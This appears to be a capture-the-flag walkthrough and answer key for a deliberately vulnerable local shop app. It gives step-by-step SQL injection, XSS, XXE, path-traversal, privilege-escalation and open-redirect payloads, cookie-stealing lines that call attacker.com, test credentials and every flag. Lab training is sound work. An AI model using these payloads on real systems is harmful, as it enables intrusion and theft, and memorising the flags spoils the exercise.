================================================================================
                    HACKAZON WEB EXPLOITATION GUIDE
                         *** 15+ VULNERABILITIES ***
================================================================================

Application: Hackazon E-Commerce Platform
Frontend: http://localhost:3001
Backend API: http://localhost:4000

This guide shows how to hack Hackazon through the WEB INTERFACE (port 3001).
Each vulnerability includes what to put in your browser's URL bar and what
happens when you do. Backend API methods are provided as alternatives.

TEST ACCOUNTS:
- Admin:  admin@shopsmart.com / admin123
- User 1: john@example.com / password123
- User 2: jane@example.com / password123

================================================================================
VULNERABILITY 1: SQL INJECTION - Product Search
================================================================================

üåê FRONTEND EXPLOITATION (Port 3001):

Step 1: Go to the search page
Browser: http://localhost:3001/search

Step 2: Use SQL injection in the category parameter
Browser: http://localhost:3001/search?category=1 OR 1=1

What happens: Bypasses category filter, shows all products

Step 3: Extract admin secrets table using UNION
Browser: http://localhost:3001/search?category=-1 UNION SELECT id, key, value, 0, NULL, 0, now() FROM admin_secret--

What happens: Shows admin secrets as "products" including flags

Step 4: Get specific flag
Browser: http://localhost:3001/search?category=-1 UNION SELECT id, key, value, 0, NULL, 0, now() FROM admin_secret WHERE key='sqli_flag'--

üîß BACKEND API (Alternative):
curl -s "http://localhost:4000/api/v1/products/search?category=-1%20UNION%20SELECT%20id,%20key,%20value,%200,%20NULL,%200,%20now()%20FROM%20admin_secret%20WHERE%20key=%27sqli_flag%27--" | jq -r '.items[0].description'

FLAG: PCTFS{50f9e246-d6be-4559-b20d-6b63b97f1553}

================================================================================
VULNERABILITY 2: INSECURE DIRECT OBJECT REFERENCE (IDOR) - User Profiles
================================================================================

üåê FRONTEND EXPLOITATION (Port 3001):

This vulnerability is backend-only, no frontend page displays user profiles by ID.

üîß BACKEND API:
Step 1: Access admin's profile directly (no auth needed)
Browser: http://localhost:4000/api/v1/user/1

What happens: Returns admin user data including secret note with flag

Step 2: Extract flag with curl
curl -s "http://localhost:4000/api/v1/user/1" | jq -r '.secretNote'

FLAG: PCTFS{6bec958b-6a9f-48b2-856c-d7a86a21532a}

================================================================================
VULNERABILITY 3: INSECURE DIRECT OBJECT REFERENCE - Order Access (SQL Injection)
================================================================================

üåê FRONTEND EXPLOITATION (Port 3001):

Step 1: Login as regular user
Browser: http://localhost:3001/login
Enter: john@example.com / password123

Step 2: Open your legitimate order page
Browser: http://localhost:3001/orders/2

Step 3: Swap the `2` for `1` in the address bar
Browser: http://localhost:3001/orders/1

What happens: The page re-requests data for order `1`, leaks the admin's gift note, and the React app automatically appends ` OR 1=1--` to the backend request so every order is returned.

Variant: Encode the payload yourself for direct navigation  
Browser: http://localhost:3001/orders/1%20OR%201%3D1--

What happens: Same leak as above, but you can paste this straight into the browser.

üîß BACKEND API (Alternative for debugging only):
# Login first
curl -X POST http://localhost:4000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@example.com","password":"password123"}' \
  -c /tmp/cookies.txt

# Access admin order with SQLi payload
curl -s -b /tmp/cookies.txt "http://localhost:4000/api/v1/orders/1%20OR%201=1--" | jq '.giftNote'

FLAG: PCTFS{4274555c-87ff-419c-8cd2-ac6af19f3480} (rotates on each seed)
Location: Admin order (ID 1), gift_note field

================================================================================
VULNERABILITY 4: STORED XSS - Product Reviews
================================================================================

üåê FRONTEND EXPLOITATION (Port 3001):

Step 1: Login
Browser: http://localhost:3001/login
Enter: john@example.com / password123

Step 2: Go to any product page
Browser: http://localhost:3001/product/1

Step 3: Submit XSS payload in review (use Developer Console)
Open browser console (F12) and run:
```javascript
fetch('http://localhost:4000/api/v1/reviews', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({
    productId: 1,
    rating: 5,
    text: '<img src=x onerror=alert("XSS")>'
  })
}).then(r => r.json()).then(d => console.log(d))
```

Step 4: Reload product page to see XSS fire
Browser: http://localhost:3001/product/1

What happens: Two alerts popup - your XSS + flag alert

üîß BACKEND API (Alternative):
curl -X POST http://localhost:4000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@example.com","password":"password123"}' \
  -c /tmp/cookies.txt

curl -s -X POST http://localhost:4000/api/v1/reviews \
  -H "Content-Type: application/json" \
  -b /tmp/cookies.txt \
  -d '{"productId":1,"rating":5,"text":"<img src=x onerror=alert(\"XSS\")>"}' | jq '.'

FLAG: PCTFS{stored_xss_alert_flag}

Other Payloads:
- <svg/onload=alert('XSS')>
- <img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>

================================================================================
VULNERABILITY 5: REFLECTED XSS - Error Messages
================================================================================

üåê FRONTEND EXPLOITATION (Port 3001):

Step 1: Access invalid product ID with HTML payload
Browser: http://localhost:3001/product/<img src=x onerror=alert('XSS')>

What happens: Two alerts fire - your XSS + flag alert

Step 2: Cookie theft payload
Browser: http://localhost:3001/product/<img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>

What happens: Sends cookies to attacker server

FLAG: PCTFS{reflected_xss_alert_flag}

Note: Must test in browser (client-side rendering), don't use "/" in payload

================================================================================
VULNERABILITY 6: MASS ASSIGNMENT - Privilege Escalation
================================================================================

üåê FRONTEND EXPLOITATION (Port 3001):

Mass assignment requires direct API access, no frontend form exists.

üîß BACKEND API:
Step 1: Login as regular user
curl -X POST http://localhost:4000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@example.com","password":"password123"}' \
  -c /tmp/cookies.txt

Step 2: Check current role
curl -s -b /tmp/cookies.txt "http://localhost:4000/api/v1/user/profile" | jq '.role'

Step 3: Escalate to admin
curl -s -X PUT http://localhost:4000/api/v1/user/profile \
  -H "Content-Type: application/json" \
  -b /tmp/cookies.txt \
  -d '{"role":"admin"}' | jq '.'

FLAG: PCTFS{mass_assignment_privilege_escalation}

================================================================================
VULNERABILITY 7: VULNERABLE COMPONENT - Debug Console (eval RCE)
================================================================================

üåê FRONTEND EXPLOITATION (Port 3001):

Debug console is backend-only, no frontend interface.

üîß BACKEND API:
Step 1: Discover endpoint
curl -s -X POST http://localhost:4000/api/v1/admin/debug \
  -H "Content-Type: application/json" -d '{}' | jq '.'

Step 2: Brute force PIN (hint: common PINs like 1234)
curl -s -X POST http://localhost:4000/api/v1/admin/debug \
  -H "Content-Type: application/json" \
  -d '{"pin":"1234","code":"2+2"}' | jq '.'

Step 3: Enumerate secrets
curl -s -X POST http://localhost:4000/api/v1/admin/debug \
  -H "Content-Type: application/json" \
  -d '{"pin":"1234","code":"Object.keys(debug_secrets)"}' | jq '.'

Step 4: Extract flag
curl -s -X POST http://localhost:4000/api/v1/admin/debug \
  -H "Content-Type: application/json" \
  -d '{"pin":"1234","code":"debug_secrets.console_flag"}' | jq -r '.result'

FLAG: PCTFS{eval_debug_console_rce}
PIN: 1234

================================================================================
VULNERABILITY 8: VULNERABLE COMPONENT - Pillow CVE-2021-25287
================================================================================

üåê FRONTEND EXPLOITATION (Port 3001):

Pillow image processing is backend-only.

üîß BACKEND API:
Step 1: Discover Pillow version
curl -s -X POST http://localhost:4000/api/v1/admin/upload-product-image \
  -H "Content-Type: application/json" -d '{}' | jq '.'

Step 2: Trigger buffer overflow with EPS format
curl -s -X POST http://localhost:4000/api/v1/admin/upload-product-image \
  -H "Content-Type: application/json" \
  -d '{"productId":1,"format":"eps"}' | jq '.'

Step 3: Extract leaked memory
curl -s -X POST http://localhost:4000/api/v1/admin/upload-product-image \
  -H "Content-Type: application/json" \
  -d '{"productId":1,"format":"EPS"}' | jq -r '.leaked_memory.adjacent_memory_leak'

FLAG: PCTFS{pillow_8_1_0_buffer_overflow_memory_leak}
CVE: CVE-2021-25287

================================================================================
VULNERABILITY 9: XML EXTERNAL ENTITY (XXE) - Product Import
================================================================================

üåê FRONTEND EXPLOITATION (Port 3001):

Step 1: Login and go to admin catalog import
Browser: http://localhost:3001/admin/catalog

Step 2: Replace XML with XXE payload to read /etc/passwd
Paste in textbox:
<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "/etc/passwd">]>
<products><product>&xxe;</product></products>

Step 3: Click "Import Catalog"
What happens: Server reads /etc/passwd and returns contents

Step 4: Read flag file
Paste in textbox:
<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "/app/secrets/flag.txt">]>
<products><product>&xxe;</product></products>

üîß BACKEND API (Alternative):
curl -s -X POST http://localhost:4000/api/v1/admin/import \
  -H "Content-Type: application/json" \
  -H "x-admin: true" \
  -d '{"xml":"<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"/app/secrets/flag.txt\">]><products><product>&xxe;</product></products>"}' | jq -r '.flag'

FLAG: PCTFS{xxe_file_read_external_entity}

================================================================================
VULNERABILITY 10: XML EXTERNAL ENTITY (XXE) - Invoice Parser
================================================================================

üåê FRONTEND EXPLOITATION (Port 3001):

Step 1: Go to invoice parser tool (no auth required)
Browser: http://localhost:3001/tools/invoice-parser

Step 2: Replace XML with XXE payload
Paste in textbox:
<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "/etc/passwd">]>
<invoices><invoice>&xxe;</invoice></invoices>

Step 3: Click "Parse Invoice"
What happens: Shows /etc/passwd contents

Step 4: Read flag file
Paste in textbox:
<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "/app/secrets/flag.txt">]>
<invoices><invoice>&xxe;</invoice></invoices>

üîß BACKEND API (Alternative):
curl -s -X POST http://localhost:4000/api/v1/invoice/parse \
  -H "Content-Type: application/json" \
  -d '{"xml":"<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"/app/secrets/flag.txt\">]><invoices><invoice>&xxe;</invoice></invoices>"}' | jq -r '.flag'

FLAG: PCTFS{xxe_file_read_external_entity}

================================================================================
VULNERABILITY 11: PATH TRAVERSAL - Invoice Download
================================================================================

üåê FRONTEND EXPLOITATION (Port 3001):

Path traversal endpoint is backend-only.

üîß BACKEND API:
Step 1: Test basic path traversal (blocked)
Browser: http://localhost:4000/api/v1/download/invoice?file=../../etc/passwd

What happens: "Invalid file path detected" error with bypass hints

Step 2: Bypass with ....// technique
Browser: http://localhost:4000/api/v1/download/invoice?file=....//....//....//....//etc/passwd

What happens: Returns /etc/passwd contents

Step 3: Read flag file
Browser: http://localhost:4000/api/v1/download/invoice?file=....//....//....//....//app/flag.txt

curl -s "http://localhost:4000/api/v1/download/invoice?file=....//....//....//....//app/flag.txt"

FLAG: PCTFS{path_traversal_invoice_download_bypass}

Bypass: ....// ‚Üí ../ (after validation)

================================================================================
VULNERABILITY 12: PATH TRAVERSAL - Profile Picture Upload
================================================================================

üåê FRONTEND EXPLOITATION (Port 3001):

Step 1: Login
Browser: http://localhost:3001/login
Enter: john@example.com / password123

Step 2: Go to profile page
Browser: http://localhost:3001/profile

Step 3: Try path traversal in filename (blocked)
In "Upload Picture" field, enter: ../../etc/passwd
Click "Upload Picture"
What happens: "Invalid filename" error with bypass hints

Step 4: Bypass with absolute path
In "Upload Picture" field, enter: /etc/passwd
Click "Upload Picture"
What happens: Shows /etc/passwd contents in result box

Step 5: Read flag file
In "Upload Picture" field, enter: /app/secrets/path_traversal_flag.txt
Click "Upload Picture"

üîß BACKEND API (Alternative):
curl -X POST http://localhost:4000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@example.com","password":"password123"}' \
  -c /tmp/cookies.txt

curl -s -X POST http://localhost:4000/api/v1/upload/profile-picture \
  -b /tmp/cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"filename":"/app/secrets/path_traversal_flag.txt","content":"test"}' | jq '.'

FLAG: PCTFS{path_traversal_profile_picture_bypass}

Bypass: Absolute paths (/) bypass ../ validation

================================================================================
VULNERABILITY 13: SENSITIVE DATA EXPOSURE - Configuration API
================================================================================

üåê FRONTEND EXPLOITATION (Port 3001):

Config endpoint is backend-only, no frontend page accesses it.

üîß BACKEND API:
Step 1: Access without header (public data only)
Browser: http://localhost:4000/api/v1/config

Step 2: Add admin header with correct value
curl -s "http://localhost:4000/api/v1/config" -H "x-admin-key: admin" | jq '.'

What happens: Returns full config with database URLs, secrets, admin creds

Step 3: Extract flag
curl -s "http://localhost:4000/api/v1/config" -H "x-admin-key: admin" | jq -r '.flag'

FLAG: PCTFS{configuration_data_exposed}

Headers that work:
- x-admin-key: admin
- x-admin-key: ADMIN

================================================================================
VULNERABILITY 14: OPEN REDIRECT - Post-Login Redirect
================================================================================

üåê FRONTEND EXPLOITATION (Port 3001):

Open redirect is backend-only POST endpoint.

üîß BACKEND API:
Step 1: Normal internal redirect
curl -X POST http://localhost:4000/api/v1/auth/login-redirect \
  -H "Content-Type: application/json" \
  -d '{"email":"john@example.com","password":"password123","next":"/dashboard"}'

Step 2: Open redirect to external site
curl -i -X POST http://localhost:4000/api/v1/auth/login-redirect \
  -H "Content-Type: application/json" \
  -d '{"email":"john@example.com","password":"password123","next":"http://evil.com"}'

What happens: 302 redirect to http://evil.com

Step 3: Get flag (include "evil" in URL)
curl -i -X POST http://localhost:4000/api/v1/auth/login-redirect \
  -H "Content-Type: application/json" \
  -d '{"email":"john@example.com","password":"password123","next":"http://evil.com/phishing"}' | grep -i "x-open-redirect-flag"

FLAG: PCTFS{open_redirect_post_login}

Phishing Scenario:
Victim sees: http://localhost:4000/login?next=http://attacker.com/fake-login
After real login ‚Üí redirected to attacker site ‚Üí credentials harvested

================================================================================
VULNERABILITY 15: OPEN REDIRECT - Affiliate Tracking
================================================================================

üåê FRONTEND EXPLOITATION (Port 3001):

Step 1: Go to affiliate page
Browser: http://localhost:3001/affiliate

Step 2: Click any offer link (e.g., "Aurora Special")
What happens: Shows shareable link with tracking

üîß BACKEND API:
Step 1: Test direct redirect
curl -s "http://localhost:4000/api/v1/track?partner_id=test&redirect=http://evil.com" | jq '.'

What happens: Returns JSON with flag and redirect target

FLAG: PCTFS{pctfs_vip_coupon:R3S3CURITY143}

================================================================================
VULNERABILITY 16: SQL INJECTION + IDOR - Order Lookup (API)
================================================================================

üîß BACKEND EXPLOITATION (Port 4000):

Step 1: Login as regular user (saves session cookie)
curl -X POST http://localhost:4000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@example.com","password":"password123"}' \
  -c /tmp/cookies.txt

Step 2: Trigger the raw IDOR
curl -s -b /tmp/cookies.txt "http://localhost:4000/api/v1/orders/1" | jq '.giftNote'

What happens: Returns the admin's order even though you're not the owner.

Step 3: Leverage SQL injection in order ID
curl -s -b /tmp/cookies.txt "http://localhost:4000/api/v1/orders/1%20OR%201=1--" | jq '.'

What happens: SQL injection bypass pulls every order record and exposes all gift notes.

FLAG: PCTFS{4274555c-87ff-419c-8cd2-ac6af19f3480} (rotates on each seed)
Location: Admin order (ID 1), gift_note field

================================================================================
SUMMARY OF ALL FLAGS
================================================================================

1.  SQL Injection (Search):         PCTFS{50f9e246-d6be-4559-b20d-6b63b97f1553}
2.  IDOR (User Profile):            PCTFS{6bec958b-6a9f-48b2-856c-d7a86a21532a}
3.  IDOR (Order via SQLi):          PCTFS{4274555c-87ff-419c-8cd2-ac6af19f3480}
4.  Stored XSS:                     PCTFS{stored_xss_alert_flag}
5.  Reflected XSS:                  PCTFS{reflected_xss_alert_flag}
6.  Mass Assignment:                PCTFS{mass_assignment_privilege_escalation}
7.  Debug Console:                  PCTFS{eval_debug_console_rce}
8.  Pillow CVE:                     PCTFS{pillow_8_1_0_buffer_overflow_memory_leak}
9.  XXE (Product Import):           PCTFS{xxe_file_read_external_entity}
10. XXE (Invoice Parser):           PCTFS{xxe_file_read_external_entity}
11. Path Traversal (Invoice):       PCTFS{path_traversal_invoice_download_bypass}
12. Path Traversal (Profile Pic):   PCTFS{path_traversal_profile_picture_bypass}
13. Config Exposure:                PCTFS{configuration_data_exposed}
14. Open Redirect (Login):          PCTFS{open_redirect_post_login}
15. Open Redirect (Affiliate):      PCTFS{pctfs_vip_coupon:R3S3CURITY143}
16. SQL Injection + IDOR (API):     PCTFS{4274555c-87ff-419c-8cd2-ac6af19f3480}

Total: 16 Vulnerabilities | 13 Unique Flags

================================================================================
QUICK FRONTEND ACCESS GUIDE
================================================================================

üåê FRONTEND PAGES (Port 3001):
- Product Search:     http://localhost:3001/search
- Product Page:       http://localhost:3001/product/1
- Order Lookup:       http://localhost:3001/orders/1
- Profile Upload:     http://localhost:3001/profile
- Admin XML Import:   http://localhost:3001/admin/catalog
- Invoice Parser:     http://localhost:3001/tools/invoice-parser
- Affiliate:          http://localhost:3001/affiliate
- Login:              http://localhost:3001/login

üîß BACKEND ENDPOINTS (Port 4000):
- User Profile:       http://localhost:4000/api/v1/user/:id
- Config Exposure:    http://localhost:4000/api/v1/config
- Debug Console:      http://localhost:4000/api/v1/admin/debug
- Invoice Download:   http://localhost:4000/api/v1/download/invoice
- Profile Update:     http://localhost:4000/api/v1/user/profile

================================================================================
TESTING NOTES
================================================================================

‚úÖ Frontend runs on port 3001 (not 3000)
‚úÖ Most exploits can be done through web interface
‚úÖ XSS flags require browser testing (alerts)
‚úÖ Some backend-only endpoints need curl
‚úÖ Use /tmp/cookies.txt for cookie storage
‚úÖ Some flags are dynamic UUIDs (regenerated on seed)

üõ°Ô∏è DEFENSIVE RECOMMENDATIONS:
- Use parameterized queries for SQL
- Implement proper authorization checks
- Sanitize all user input and output
- Disable XXE in XML parsers
- Validate file paths with whitelists
- Use strong authentication mechanisms
- Encode output for XSS prevention
- Validate redirect targets with allowlists
- Never expose configuration endpoints
- Disable eval() and dangerous functions

================================================================================
END OF GUIDE - TESTED AND VERIFIED
================================================================================
